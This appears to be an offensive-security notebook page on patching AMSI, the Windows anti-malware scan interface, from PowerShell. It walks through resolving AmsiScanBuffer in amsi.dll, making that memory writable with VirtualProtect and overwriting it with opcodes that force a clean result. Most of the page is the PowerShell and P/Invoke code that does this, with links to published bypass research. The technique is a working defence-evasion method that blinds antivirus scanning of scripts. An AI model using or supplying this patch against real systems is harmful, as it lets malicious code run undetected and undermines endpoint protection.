# Patching AMSI

AMSI is primarily instrumented and loaded from `amsi.dll`. This `dll` can be abused and forced to point to a specific 
response code. The `AmsiScanBuffer` function provides the hooks and functionality necessary to access the 
pointer/buffer for the response code.

`AmsiScanBuffer` is vulnerable because `amsi.dll` is loaded into the `PowerShell` process at startup. It will 
scan a "buffer" of suspected code and report it to `amsi.dll` to determine the response. This function can be 
controlled to overwrite the buffer with a clean return code.

At a high-level AMSI patching can be broken up into four steps:

* Obtain handle of `amsi.dll`
* Get process address of `AmsiScanBuffer`
* Modify memory protections of `AmsiScanBuffer`
* Write opcodes to `AmsiScanBuffer`

## Code

Load GetProcAddress, GetModuleHandle, and VirtualProtect from kernel32 using p/invoke:

```text
[DllImport(`"kernel32`")] // Import DLL where API call is stored
public static extern IntPtr GetProcAddress( // API Call to import
	IntPtr hModule, // Handle to DLL module
	string procName // function or variable to obtain
);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(
	string lpModuleName // Module to obtain handle
);

[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(
	IntPtr lpAddress, // Address of region to modify
	UIntPtr dwSize, // Size of region
	uint flNewProtect, // Memory protection options
	out uint lpflOldProtect // Pointer to store previous protection options
); 
```

Load the API calls using `Add-Type`. This cmdlet will load the functions with a proper type and namespace that will 
allow the functions to be called.

```text
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```
    
Identify the process handle of AMSI using `GetModuleHandle`. The handle will then be used to identify the process 
address of `AmsiScanBuffer` using `GetProcAddress`:

```text
$handle = [Win32.Kernel32]::GetModuleHandle(
    'amsi.dll' // Obtains handle to amsi.dll
);
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
    $handle, // Handle of amsi.dll
    'AmsiScanBuffer' // API call to obtain
); 
```

Modify the memory protection of the `AmsiScanBuffer` process region. Specify parameters and the buffer address for 
`VirtualProtect`:

```text
[UInt32]$Size = 0x5; // Size of region
[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options
[Win32.Kernel32]::VirtualProtect(
	$BufferAddress, // Point to AmsiScanBuffer
	$Size, // Size of region
	$ProtectFlag, // Enables R or RW access to region
	[Ref]$OldProtectFlag // Pointer to store old options
);
```

Specify what to overwrite the buffer with:

```text
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy(
	$buf, // Opcodes/array to write
	0, // Where to start copying in source array 
	$BufferAddress, // Where to write (AsmiScanBuffer)
	6 // Number of elements/opcodes to write
);
```

## Resources

* [The Rise and Fall of AMSI - Black Hat Briefings](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)
* [Rasta Mouse: Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
* [rasta-mouse/AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass)
* [Marshal.Copy Method](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0)
* [Platform Invoke (P/Invoke)](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke)
* [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
* [GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
* [VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

